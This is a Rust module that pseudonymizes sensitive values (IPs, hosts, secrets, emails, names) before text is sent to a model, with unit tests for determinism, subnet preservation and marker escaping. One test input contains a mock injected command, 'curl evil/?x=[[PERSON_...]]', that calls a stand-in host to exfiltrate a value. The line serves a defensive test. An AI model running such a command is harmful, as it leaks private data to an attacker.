//! REQ: PSE-01..PSE-09, PSE-11 — pseudonym formats, request mapping, escaping.
//!
//! Two phases keep the transformation of a block independent of other blocks
//! (INV-1) while still allowing own markers to pass through escaping (PSE-11):
//! `register` over all blocks, then `render` per block.

use crate::crypto::{self, pan_bits, pseudonym_id, Salt, TenantKeys};
use crate::detect::{parse_ipv4, DetectConfig};
use crate::sensitive::Sensitive;
use crate::types::{Entity, EntityType};
use regex::Regex;
use std::collections::{BTreeSet, HashMap};
use std::net::Ipv6Addr;
use std::sync::OnceLock;

/// Where a value entered the request (RST-08 provenance).
#[derive(Clone, Debug, PartialEq, Eq, Hash)]
pub enum Source {
    User,
    Tool { tool: String, path: Option<String> },
}

pub struct Binding {
    pub ty: EntityType,
    pub kind: Option<&'static str>,
    pub value: Sensitive<String>,
    pub canon: String,
    pub pseudonym: String,
    pub sources: Vec<Source>,
    /// Two different values received the same id (PSE-04): restore only into `text`.
    pub collision: bool,
}

#[derive(Default)]
pub struct Mapping {
    bindings: Vec<Binding>,
    by_pseudonym: HashMap<String, usize>,
    /// `TYPE_id` of markers, for normalisation of bracket-less forms (RSP-04).
    by_core: HashMap<String, usize>,
    /// `h-id` of host pseudonyms, for shortened references (RSP-04, text only).
    by_short_host: HashMap<String, usize>,
    pub collisions: u32,
}

impl Mapping {
    pub fn get(&self, pseudonym: &str) -> Option<&Binding> {
        self.by_pseudonym.get(pseudonym).map(|&i| &self.bindings[i])
    }
    pub fn len(&self) -> usize {
        self.bindings.len()
    }
    pub fn is_empty(&self) -> bool {
        self.bindings.is_empty()
    }
    pub fn iter(&self) -> impl Iterator<Item = &Binding> {
        self.bindings.iter()
    }
    pub fn contains(&self, pseudonym: &str) -> bool {
        self.by_pseudonym.contains_key(pseudonym)
    }
    pub fn get_core(&self, core: &str) -> Option<&Binding> {
        self.by_core.get(core).map(|&i| &self.bindings[i])
    }
    pub fn get_short_host(&self, short: &str) -> Option<&Binding> {
        self.by_short_host.get(short).map(|&i| &self.bindings[i])
    }

    pub(crate) fn insert(&mut self, b: Binding) {
        if let Some(&i) = self.by_pseudonym.get(&b.pseudonym) {
            let existing = &mut self.bindings[i];
            if existing.canon == b.canon && existing.ty == b.ty {
                for s in b.sources {
                    if !existing.sources.contains(&s) {
                        existing.sources.push(s);
                    }
                }
            } else {
                existing.collision = true;
                self.collisions += 1;
            }
            return;
        }
        let idx = self.bindings.len();
        self.by_pseudonym.insert(b.pseudonym.clone(), idx);
        if let Some(rest) = b.pseudonym.strip_prefix("[[") {
            if let Some(core) = rest.split([' ', ']']).next() {
                self.by_core.entry(core.to_string()).or_insert(idx);
            }
        } else if b.ty == EntityType::Host {
            if let Some(short) = b.pseudonym.split('.').next() {
                self.by_short_host.entry(short.to_string()).or_insert(idx);
            }
        }
        self.bindings.push(b);
    }
}

#[derive(Clone, Debug)]
pub struct PseudoConfig {
    /// Show `len=` for secrets (ДОП-5; off by default).
    pub secret_len: bool,
    pub roles: Vec<String>,
    pub envs: Vec<String>,
}

impl Default for PseudoConfig {
    fn default() -> Self {
        let v = |xs: &[&str]| xs.iter().map(|s| s.to_string()).collect();
        Self {
            secret_len: false,
            roles: v(&[
                "mysql", "mssql", "oracle", "postgres", "rabbit", "kafka", "redis", "vault",
                "ldap", "mail", "proxy", "pg", "db", "mq", "es", "app", "web", "api", "gw", "lb",
                "k8s", "node", "git", "ci",
            ]),
            envs: v(&["prod", "preprod", "stage", "test", "dev", "uat"]),
        }
    }
}

pub struct Pseudonymizer<'a> {
    pub keys: &'a TenantKeys,
    pub salt: &'a Salt,
    pub cfg: &'a PseudoConfig,
    pub detect: &'a DetectConfig,
}

/// Grammar of Aegis pseudonyms in input text (PSE-05, PSE-11).
fn grammar() -> &'static Regex {
    static G: OnceLock<Regex> = OnceLock::new();
    G.get_or_init(|| {
        Regex::new(concat!(
            r"\[\[[A-Z]{2,10}_[a-z2-7]{8}(?: [a-z]+=[a-z0-9,]{1,40}){0,4}\]\]",
            r"|(?:[a-z0-9\-]+\.)+aegis\.invalid",
            r"|\b2(?:4\d|5[0-5])\.\d{1,3}\.\d{1,3}\.\d{1,3}(?:/\d{1,2})?\b",
            r"|(?i:\b3fff:[0-9a-f:]+(?:/\d{1,3})?)",
        ))
        .expect("static regex")
    })
}

pub fn marker_grammar() -> &'static Regex {
    grammar()
}

const HAS_NAMES: &[(char, &str)] = &[
    ('@', "at"),
    (':', "colon"),
    ('/', "slash"),
    ('?', "qmark"),
    ('#', "hash"),
    ('[', "lbr"),
    (']', "rbr"),
    ('%', "pct"),
    (' ', "space"),
];

fn has_attr(value: &str) -> Option<String> {
    let set: BTreeSet<&str> = HAS_NAMES
        .iter()
        .filter(|(c, _)| value.contains(*c))
        .map(|(_, n)| *n)
        .collect();
    (!set.is_empty()).then(|| set.into_iter().collect::<Vec<_>>().join(","))
}

/// PSE-06: canonical form of a value.
pub fn canon(e: &Entity, value: &str) -> String {
    match e.ty {
        EntityType::Host | EntityType::Email => value.trim().trim_end_matches('.').to_lowercase(),
        EntityType::Phone => {
            let d: String = value.chars().filter(|c| c.is_ascii_digit()).collect();
            if d.len() == 11 && d.starts_with('8') {
                format!("7{}", &d[1..])
            } else {
                d
            }
        }
        EntityType::Person => e.person_key.clone().unwrap_or_else(|| value.to_lowercase()),
        EntityType::Project | EntityType::System | EntityType::Org => value.to_lowercase(),
        _ => value.to_string(),
    }
}

impl<'a> Pseudonymizer<'a> {
    fn id(&self, ty: &str, canon: &str) -> String {
        pseudonym_id(self.keys, self.salt, ty, canon)
    }

    fn marker(&self, ty: EntityType, canon: &str, attrs: &[(&str, String)]) -> String {
        let mut s = format!("[[{}_{}", ty.marker(), self.id(ty.marker(), canon));
        for (k, v) in attrs {
            s.push_str(&format!(" {k}={v}"));
        }
        s.push_str("]]");
        s
    }

    /// PSE-07 for IPv4: private ranges map into class E, preserving subnets.
    fn ipv4_range(&self, ip: u32) -> Option<(u32, u8, u32, usize)> {
        let mut table: Vec<(u32, u8, u32)> = vec![
            (0x0A00_0000, 8, 240 << 24),
            (0xAC10_0000, 12, 241 << 24),
            (0xC0A8_0000, 16, 242 << 24),
            (0x6440_0000, 10, 243 << 24),
        ];
        for (i, &(b, l)) in self.detect.company_ranges.iter().enumerate() {
            table.push((b, l.max(8), (244 + i as u32) << 24));
        }
        table.into_iter().enumerate().find_map(|(i, (b, l, t))| {
            let mask = u32::MAX << (32 - l as u32);
            (ip & mask == b & mask).then_some((b, l, t, i))
        })
    }

    fn pseudo_ipv4(&self, addr: u32) -> String {
        let Some((_, len, target, idx)) = self.ipv4_range(addr) else {
            return "240.0.0.0".into();
        };
        let host_bits = 32 - len as u32;
        let host = (addr as u128) & ((1u128 << host_bits) - 1);
        let mapped = pan_bits(
            self.keys,
            self.salt,
            format!("ip4/{idx}").as_bytes(),
            host,
            host_bits,
        ) as u32;
        let out = target | mapped;
        format!(
            "{}.{}.{}.{}",
            out >> 24,
            (out >> 16) & 255,
            (out >> 8) & 255,
            out & 255
        )
    }

    /// IPv6: a /48 maps by PRF to one of 2^28 /48s inside 3fff::/20; the low 80 bits by Crypto-PAn.
    fn pseudo_ipv6(&self, addr: Ipv6Addr) -> String {
        let v = u128::from(addr);
        let prefix48 = v >> 80;
        let low80 = v & ((1u128 << 80) - 1);
        let mac = self
            .keys
            .k_t
            .mac(&[b"ip6/48", &self.salt.0, &prefix48.to_be_bytes()]);
        let rnd28 = (u32::from_be_bytes([mac[0], mac[1], mac[2], mac[3]]) & 0x0FFF_FFFF) as u128;
        let top48 = (0x3fff0u128 << 28) | rnd28; // 20 + 28 = 48 bits
        let mapped = pan_bits(self.keys, self.salt, b"ip6/low", low80, 80);
        Ipv6Addr::from((top48 << 80) | mapped).to_string()
    }

    fn pseudo_ip(&self, value: &str) -> String {
        let (addr, len) = match value.split_once('/') {
            Some((a, l)) => (a, Some(l)),
            None => (value, None),
        };
        let base = if let Some(ip) = parse_ipv4(addr) {
            self.pseudo_ipv4(ip)
        } else if let Ok(a6) = addr.parse::<Ipv6Addr>() {
            self.pseudo_ipv6(a6)
        } else {
            format!("240.{}", self.id("IP", value).len())
        };
        match len {
            Some(l) => format!("{base}/{l}"),
            None => base,
        }
    }

    fn pseudo_host(&self, canon: &str) -> String {
        let mut labels = canon.split('.');
        let first = labels.next().unwrap_or("");
        let zone: Vec<&str> = labels.collect();
        let letters: String = first
            .chars()
            .filter(|c| c.is_ascii_alphabetic() || *c == '-')
            .collect();
        let all_tokens: Vec<String> = canon
            .split(|c: char| !c.is_ascii_alphabetic())
            .filter(|t| !t.is_empty())
            .map(|t| t.to_string())
            .collect();
        let role = self
            .cfg
            .roles
            .iter()
            .find(|r| letters.contains(r.as_str()))
            .map(|s| s.as_str())
            .unwrap_or("x");
        let env = self
            .cfg
            .envs
            .iter()
            .find(|e| {
                all_tokens.iter().any(|t| {
                    t == *e
                        || (t.len() > e.len()
                            && t.starts_with(e.as_str())
                            && t.len() <= e.len() + 1)
                })
            })
            .map(|s| s.as_str())
            .unwrap_or("x");
        let zid = self.id("HOSTZONE", &zone.join("."));
        format!(
            "h-{}.{role}.{env}.z-{zid}.aegis.invalid",
            self.id("HOST", canon)
        )
    }

    /// Pseudonym text for a detected value.
    pub fn pseudonym(&self, e: &Entity, value: &str) -> (String, String) {
        let c = canon(e, value);
        let p = match e.ty {
            EntityType::Ip => self.pseudo_ip(&c),
            EntityType::Host => self.pseudo_host(&c),
            EntityType::Secret => {
                let mut attrs = vec![];
                if let Some(k) = e.kind {
                    attrs.push(("kind", k.to_string()));
                }
                if let Some(h) = has_attr(value) {
                    attrs.push(("has", h));
                }
                if self.cfg.secret_len {
                    attrs.push(("len", value.chars().count().to_string()));
                }
                self.marker(e.ty, &c, &attrs)
            }
            EntityType::Email => {
                let mut attrs = vec![];
                if let Some(pk) = &e.person_key {
                    attrs.push(("person", self.id("PERSON", pk)));
                }
                self.marker(e.ty, &c, &attrs)
            }
            _ => self.marker(e.ty, &c, &[]),
        };
        (c, p)
    }

    /// Phase 1: record bindings for every entity of a block.
    pub fn register(
        &self,
        text: &str,
        entities: &[Entity],
        source: &Source,
        mapping: &mut Mapping,
    ) {
        for e in entities {
            let value = &text[e.span.start..e.span.end];
            let (c, p) = self.pseudonym(e, value);
            mapping.insert(Binding {
                ty: e.ty,
                kind: e.kind,
                value: Sensitive::new(value.to_string()),
                canon: c,
                pseudonym: p,
                sources: vec![source.clone()],
                collision: false,
            });
        }
    }

    /// Phase 2: replace entities and escape foreign Aegis-looking strings (PSE-11).
    pub fn render(&self, text: &str, entities: &[Entity], mapping: &mut Mapping) -> String {
        let mut out = String::with_capacity(text.len());
        let mut cursor = 0;
        for e in entities {
            self.escape_into(&text[cursor..e.span.start], mapping, &mut out);
            let (_, p) = self.pseudonym(e, &text[e.span.start..e.span.end]);
            out.push_str(&p);
            cursor = e.span.end;
        }
        self.escape_into(&text[cursor..], mapping, &mut out);
        out
    }

    fn escape_into(&self, seg: &str, mapping: &mut Mapping, out: &mut String) {
        let mut last = 0;
        for m in grammar().find_iter(seg) {
            out.push_str(&seg[last..m.start()]);
            let s = m.as_str();
            if mapping.contains(s) {
                // Own pseudonym computed in this request (PSE-11 a): keep.
                out.push_str(s);
            } else {
                let c = s.to_string();
                let marker = format!("[[LIT_{}]]", self.id("LIT", &c));
                mapping.insert(Binding {
                    ty: EntityType::Lit,
                    kind: None,
                    value: Sensitive::new(c.clone()),
                    canon: c,
                    pseudonym: marker.clone(),
                    sources: vec![Source::User],
                    collision: false,
                });
                out.push_str(&marker);
            }
            last = m.end();
        }
        out.push_str(&seg[last..]);
    }
}

/// Convenience: transform a list of blocks with a detection pipeline.
pub fn transform_blocks(
    p: &Pseudonymizer<'_>,
    pipeline: &crate::detect::Pipeline,
    blocks: &[(String, Source)],
    mapping: &mut Mapping,
) -> Vec<String> {
    let scanned: Vec<Vec<Entity>> = blocks.iter().map(|(t, _)| pipeline.scan(t)).collect();
    for ((t, s), es) in blocks.iter().zip(&scanned) {
        p.register(t, es, s, mapping);
    }
    blocks
        .iter()
        .zip(&scanned)
        .map(|((t, _), es)| p.render(t, es, mapping))
        .collect()
}

#[allow(dead_code)]
fn _use(_: &crypto::AnchorSource) {}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::crypto::{derive_salt, SaltInput};
    use crate::detect::{DetectConfig, Dictionary, Pipeline};

    struct Fx {
        keys: TenantKeys,
        salt: Salt,
        cfg: PseudoConfig,
        det: DetectConfig,
        pipe: Pipeline,
    }

    fn fx_with(conv: &str) -> Fx {
        let keys = TenantKeys::from_secrets("t1", b"k-tenant", b"k-audit");
        let (salt, _) = derive_salt(
            &keys,
            &SaltInput {
                principal: "u",
                header: Some(conv),
                session_field: None,
                first_user_message: &[],
            },
        );
        let det = DetectConfig {
            internal_zones: vec!["company.ru".into()],
            ..Default::default()
        };
        let mut d = Dictionary::default();
        d.add_person("Иван", "Петров");
        let pipe = Pipeline::new(det.clone(), d);
        Fx {
            keys,
            salt,
            cfg: PseudoConfig::default(),
            det,
            pipe,
        }
    }

    fn run(fx: &Fx, texts: &[&str]) -> (Vec<String>, Mapping) {
        let p = Pseudonymizer {
            keys: &fx.keys,
            salt: &fx.salt,
            cfg: &fx.cfg,
            detect: &fx.det,
        };
        let mut m = Mapping::default();
        let blocks: Vec<_> = texts
            .iter()
            .map(|t| (t.to_string(), Source::User))
            .collect();
        (transform_blocks(&p, &fx.pipe, &blocks, &mut m), m)
    }

    // REQ: PSE-02 — independent of order and of other blocks.
    #[test]
    fn deterministic_and_block_independent() {
        let fx = fx_with("c1");
        let a = "host prod-db01.pay.corp.local ip 10.34.18.21";
        let b = "mail ivan.petrov@corp.ru";
        let (o1, _) = run(&fx, &[a, b]);
        let (o2, _) = run(&fx, &[b, a]);
        assert_eq!(o1[0], o2[1]);
        assert_eq!(o1[1], o2[0]);
        let (o3, _) = run(&fx, &[a]);
        assert_eq!(o3[0], o1[0]);
    }

    // REQ: PSE-03 / T2 — different conversations get different pseudonyms.
    #[test]
    fn conversations_do_not_correlate() {
        let (a, _) = run(&fx_with("c1"), &["prod-db01.pay.corp.local"]);
        let (b, _) = run(&fx_with("c2"), &["prod-db01.pay.corp.local"]);
        assert_ne!(a[0], b[0]);
    }

    // REQ: PSE-07
    #[test]
    fn host_keeps_role_env_zone() {
        let fx = fx_with("c1");
        let (o, _) = run(
            &fx,
            &["a prod-db01.pay.corp.local b prod-db02.pay.corp.local c prod-db01.pay.corp.locl"],
        );
        let hosts: Vec<_> = o[0]
            .split(' ')
            .filter(|w| w.ends_with(".aegis.invalid"))
            .collect();
        assert_eq!(
            hosts.len(),
            2,
            "typo zone is not internal and stays plain: {}",
            o[0]
        );
        assert!(hosts[0].contains(".db.prod."));
        let zone = |h: &str| {
            h.split('.')
                .find(|l| l.starts_with("z-"))
                .unwrap()
                .to_string()
        };
        assert_eq!(zone(hosts[0]), zone(hosts[1]), "same zone => same z-id");
        assert_ne!(hosts[0], hosts[1]);
        assert!(!o[0].contains("prod-db01.pay.corp.local"));
    }

    // REQ: PSE-07 — typo in a zone is visible to the model as a different zone.
    #[test]
    fn zone_typo_is_visible() {
        let fx = fx_with("c1");
        let (o, _) = run(
            &fx,
            &["x prod-db01.pay.corp.local y prod-db01.pay.corp.internal"],
        );
        let zs: Vec<_> = o[0]
            .split(' ')
            .filter(|w| w.ends_with(".aegis.invalid"))
            .map(|h| {
                h.split('.')
                    .find(|l| l.starts_with("z-"))
                    .unwrap()
                    .to_string()
            })
            .collect();
        assert_eq!(zs.len(), 2);
        assert_ne!(zs[0], zs[1]);
    }

    // REQ: PSE-07
    #[test]
    fn ipv4_class_e_and_subnets_preserved() {
        let fx = fx_with("c1");
        let (o, _) = run(
            &fx,
            &["10.34.18.21 10.34.18.77 10.34.19.5 192.168.1.1 10.34.16.0/22"],
        );
        let ws: Vec<_> = o[0].split(' ').collect();
        let oct = |s: &str| -> Vec<u32> {
            s.split('/')
                .next()
                .unwrap()
                .split('.')
                .map(|x| x.parse().unwrap())
                .collect()
        };
        assert_eq!(oct(ws[0])[0], 240);
        assert_eq!(oct(ws[3])[0], 242);
        // same /24 stays same /24
        assert_eq!(&oct(ws[0])[..3], &oct(ws[1])[..3]);
        assert_ne!(&oct(ws[0])[..3], &oct(ws[2])[..3]);
        // CIDR keeps length and contains the mapped hosts of that subnet
        assert!(ws[4].ends_with("/22"));
        assert!(!o[0].contains("10.34"));
    }

    #[test]
    fn ipv6_into_documentation_range() {
        let mut fx = fx_with("c1");
        fx.det.company_ranges.clear();
        let (o, _) = run(&fx, &["fd12:3456:789a:1::7 fd12:3456:789a:1::8"]);
        let ws: Vec<_> = o[0].split(' ').collect();
        assert!(ws[0].starts_with("3fff:"), "{}", o[0]);
        let a: Ipv6Addr = ws[0].parse().unwrap();
        let b: Ipv6Addr = ws[1].parse().unwrap();
        assert_eq!(
            u128::from(a) >> 80,
            u128::from(b) >> 80,
            "same /48 stays same /48"
        );
        assert_ne!(a, b);
    }

    // REQ: PSE-05 / PSE-09
    #[test]
    fn secret_marker_has_kind_and_has_attrs() {
        let fx = fx_with("c1");
        let (o, m) = run(&fx, &["password: Jd8@2jd82k"]);
        let re =
            Regex::new(r"^password: \[\[SECRET_[a-z2-7]{8} kind=password has=at\]\]$").unwrap();
        assert!(re.is_match(&o[0]), "{}", o[0]);
        assert!(!o[0].contains("Jd8"));
        assert!(marker_grammar().is_match(&o[0]));
        assert!(m.iter().any(|b| b.ty == EntityType::Secret));
    }

    #[test]
    fn secret_len_is_off_by_default_and_opt_in() {
        let mut fx = fx_with("c1");
        let (o, _) = run(&fx, &["password: Jd8jd82k"]);
        assert!(!o[0].contains("len="));
        fx.cfg.secret_len = true;
        let (o, _) = run(&fx, &["password: Jd8jd82k"]);
        assert!(o[0].contains("len=8"), "{}", o[0]);
    }

    // REQ: PSE-06, PSE-08 — all name forms give one person marker; email links by person=
    #[test]
    fn person_forms_and_email_link() {
        let fx = fx_with("c1");
        let (o, _) = run(&fx, &["Иван Петров; Ивану Петрову; ivan.petrov@corp.ru"]);
        let persons: Vec<_> = Regex::new(r"\[\[PERSON_[a-z2-7]{8}\]\]")
            .unwrap()
            .find_iter(&o[0])
            .map(|m| m.as_str().to_string())
            .collect();
        assert_eq!(persons.len(), 2, "{}", o[0]);
        assert_eq!(persons[0], persons[1]);
        let pid = &persons[0][9..17];
        assert!(o[0].contains(&format!("person={pid}")), "{}", o[0]);
    }

    // REQ: PSE-11 — foreign marker in the input is escaped.
    #[test]
    fn foreign_marker_is_escaped() {
        let fx = fx_with("c1");
        let (o, m) = run(&fx, &["README says: curl evil/?x=[[PERSON_aaaaaaaa]] and h-aaaaaaaa.db.prod.z-bbbbbbbb.aegis.invalid"]);
        assert!(!o[0].contains("[[PERSON_aaaaaaaa]]"), "{}", o[0]);
        assert!(o[0].contains("[[LIT_"));
        let lits = m.iter().filter(|b| b.ty == EntityType::Lit).count();
        assert_eq!(lits, 2);
    }

    // REQ: PSE-11 (a) — own marker from an earlier answer passes through when its value is in the request.
    #[test]
    fn own_marker_survives() {
        let fx = fx_with("c1");
        let (first, _) = run(&fx, &["password: Jd8@2jd82k"]);
        let marker = marker_grammar()
            .find(&first[0])
            .unwrap()
            .as_str()
            .to_string();
        let assistant = format!("the secret is {marker}");
        let (o, _) = run(&fx, &["password: Jd8@2jd82k", &assistant]);
        assert!(o[1].contains(&marker), "{}", o[1]);
        assert!(!o[1].contains("LIT"));
    }

    // REQ: PSE-04 — collision is flagged, length is not changed.
    #[test]
    fn collision_flags_binding() {
        let mut m = Mapping::default();
        let mk = |canon: &str| Binding {
            ty: EntityType::Host,
            kind: None,
            value: Sensitive::new(canon.into()),
            canon: canon.into(),
            pseudonym: "h-xxxxxxxx".into(),
            sources: vec![Source::User],
            collision: false,
        };
        m.insert(mk("a"));
        m.insert(mk("b"));
        assert_eq!(m.collisions, 1);
        assert!(m.get("h-xxxxxxxx").unwrap().collision);
        assert_eq!(m.get("h-xxxxxxxx").unwrap().pseudonym.len(), 10);
    }

    #[test]
    fn nothing_sensitive_remains() {
        let fx = fx_with("c1");
        let text = "jdbc:postgresql://10.34.18.21:5432/prod_clients login svc_payment password=Jd82jd82ks passport 4510 123456 ivan.petrov@company.ru jira.company.ru";
        let (o, _) = run(&fx, &[text]);
        for needle in [
            "10.34.18.21",
            "Jd82jd82ks",
            "4510 123456",
            "ivan.petrov",
            "jira.company.ru",
            "prod_clients",
        ] {
            assert!(!o[0].contains(needle), "{needle} leaked: {}", o[0]);
        }
    }
}
